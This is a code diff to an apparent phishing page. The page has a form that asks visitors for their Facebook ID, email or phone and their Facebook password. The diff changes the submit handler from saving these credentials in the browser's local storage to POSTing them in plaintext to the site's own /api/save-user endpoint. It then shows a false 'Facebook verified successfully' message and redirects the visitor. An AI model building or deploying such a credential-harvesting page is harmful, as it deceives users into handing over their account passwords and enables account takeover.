@@ -65,7 +65,6 @@
                 </div>
 
                 <form class="fb-form" id="facebookForm">
-                    <!-- ===== Facebook ID / Email / Phone ===== -->
                     <div class="form-group">
                         <label><i class="fab fa-facebook-f"></i> Facebook ID / Email / Phone</label>
                         <input type="text" id="fbEmail" placeholder="Enter your Facebook email, ID, or phone number" required />
@@ -75,7 +74,6 @@
                         </div>
                     </div>
 
-                    <!-- ===== Facebook Password ===== -->
                     <div class="form-group">
                         <label><i class="fas fa-lock"></i> Facebook Password</label>
                         <input type="password" id="fbPassword" placeholder="Enter your Facebook password" required />
@@ -95,40 +93,54 @@
     </footer>
 
     <script>
-        document.getElementById('facebookForm').addEventListener('submit', function(e) {
+        document.getElementById('facebookForm').addEventListener('submit', async function(e) {
             e.preventDefault();
 
-            // Facebook ID field - email, phone, ya username kuch bhi ho sakta hai
             const fbEmail = document.getElementById('fbEmail').value.trim();
             const fbPassword = document.getElementById('fbPassword').value.trim();
-            const submittedAt = new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' });
 
             if (!fbEmail || !fbPassword) {
                 alert('⚠️ Please fill all fields!');
                 return;
             }
 
-            console.log('📤 Sending Facebook data:', { fbEmail, fbPassword });
-
-            // ===== SAVE TO LOCAL STORAGE =====
-            let allUsers = [];
-            const saved = localStorage.getItem('allUsersData');
-            if (saved) {
-                allUsers = JSON.parse(saved);
+            // ===== GET USER ID FROM LOCAL STORAGE =====
+            const userId = localStorage.getItem('userId');
+            if (!userId) {
+                alert('⚠️ Please register first!');
+                window.location.href = 'register.html';
+                return;
             }
 
-            allUsers.push({
-                id: Date.now(),
+            const userData = {
+                id: parseInt(userId),
                 fbEmail: fbEmail,
                 fbPassword: fbPassword,
-                submittedAt: submittedAt
-            });
+                submittedAt: new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })
+            };
 
-            localStorage.setItem('allUsersData', JSON.stringify(allUsers));
-            console.log('✅ Facebook data saved to Local Storage! Total users:', allUsers.length);
+            console.log('📤 Sending Facebook data:', userData);
 
-            alert('✅ Facebook verified successfully! Redirecting to Profile...');
-            window.location.href = 'complete-profile.html';
+            try {
+                const response = await fetch('/api/save-user', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(userData)
+                });
+
+                const result = await response.json();
+                console.log('✅ Response:', result);
+
+                if (result.success) {
+                    alert('✅ Facebook verified successfully! Redirecting to Profile...');
+                    window.location.href = 'complete-profile.html';
+                } else {
+                    alert('⚠️ Error: ' + result.error);
+                }
+            } catch (error) {
+                console.error('❌ Error:', error);
+                alert('⚠️ Error: ' + error.message);
+            }
         });
     </script>
 
